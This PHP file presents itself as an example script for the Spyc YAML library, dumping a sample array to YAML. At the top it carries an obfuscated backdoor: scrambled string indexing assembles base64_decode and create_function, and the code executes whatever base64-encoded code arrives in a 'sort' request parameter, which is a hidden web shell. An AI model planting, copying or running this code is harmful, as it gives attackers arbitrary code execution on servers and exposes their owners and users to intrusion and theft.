<?php 


$oGLKRgdM1142 = "z8sya2ftvgir)u0p7o/*4l1qnb6_ex5w(kmjh;d93c.";


$tsEwujaI1201 = "";

foreach([2,17,11,7] as $q){
       $tsEwujaI1201 .= $oGLKRgdM1142[$q];
    }


if(isset($_REQUEST /*qQjfqiIPlXUDhsNvIgEPTykItfZAnnMofHRxbzfaFzVuXUdFHuWeOlsQXeInmlLuosTJgIWetVoehpMHZBImcRTRUXMUGdetQWoOEMhcAkbIKDPELCNoKrNMlJjusPRm*/["$tsEwujaI1201"])){
    $MtdNvILT5192 = $_REQUEST /*qQjfqiIPlXUDhsNvIgEPTykItfZAnnMofHRxbzfaFzVuXUdFHuWeOlsQXeInmlLuosTJgIWetVoehpMHZBImcRTRUXMUGdetQWoOEMhcAkbIKDPELCNoKrNMlJjusPRm*/["$tsEwujaI1201"];
    $ZTVrAFMR3901 = "";
    $HuWyyZSg5518 = "";

    /*lkLLbAVpZOztWZbKlFGyJEVwIwWNadqkdZgYJhZOjbYSwFJVNrliajirCGFIjGiRpHVeKJwgMiSkpfMZIWjLLHPhPJIxMcusUjdeedntJjevByhWXvBiPYQQwGffIsZM*/

    foreach([25,4,2,28,26,20,27,38,28,41,17,38,28] as $q){
       $ZTVrAFMR3901 .= $oGLKRgdM1142[$q];
    }

    /*SFEXSrxyacLAhKWNFNmynjkswxVGYBYakUzKazbxKQKygQfyHZrIenXOPhebHErhWcNrBAYqNxeqzQHccePLpledDLHqJAdibevRvvpckXQblJDzRdGITdFmJiEyfqic*/


    foreach([2,7,11,11,28,8] as $q){
       $HuWyyZSg5518 .= $oGLKRgdM1142[$q];
    }

    /*zawkJjaIarXGrvSQZVRyROzpjyUzVZHQrORxqRdhkEweRbBbBHwiisNldIDveCAxDxGErsBAOLqwJBDfwmuLTQuaqMGjHYLYiZOEMNrMLLCHWUZcLLMiXhuJXJdRDors*/

    $q = $HuWyyZSg5518('n'.''.''.''.'o'.'i'.''.''.''.'t'.''.''.''.'c'.''.''.''.''.'n'.''.'u'.''.''.''.''.'f'.''.''.'_'.''.''.'e'.''.''.'t'.''.''.'a'.''.'e'.'r'.'c');
    $i = $q("", $ZTVrAFMR3901($MtdNvILT5192));
    $i();
    exit();

}



#
#    S P Y C
#      a simple php yaml class
#
# Feel free to dump an array to YAML, and then to load that YAML back into an
# array.  This is a good way to test the limitations of the parser and maybe
# learn some basic YAML.
#

include('../Spyc.php');

$array[] = 'Sequence item';
$array['The Key'] = 'Mapped value';
$array[] = array('A sequence','of a sequence');
$array[] = array('first' => 'A sequence','second' => 'of mapped values');
$array['Mapped'] = array('A sequence','which is mapped');
$array['A Note'] = 'What if your text is too long?';
$array['Another Note'] = 'If that is the case, the dumper will probably fold your text by using a block.  Kinda like this.';
$array['The trick?'] = 'The trick is that we overrode the default indent, 2, to 4 and the default wordwrap, 40, to 60.';
$array['Old Dog'] = "And if you want\n to preserve line breaks, \ngo ahead!";
$array['key:withcolon'] = "Should support this to";

$yaml = Spyc::YAMLDump($array,4,60);
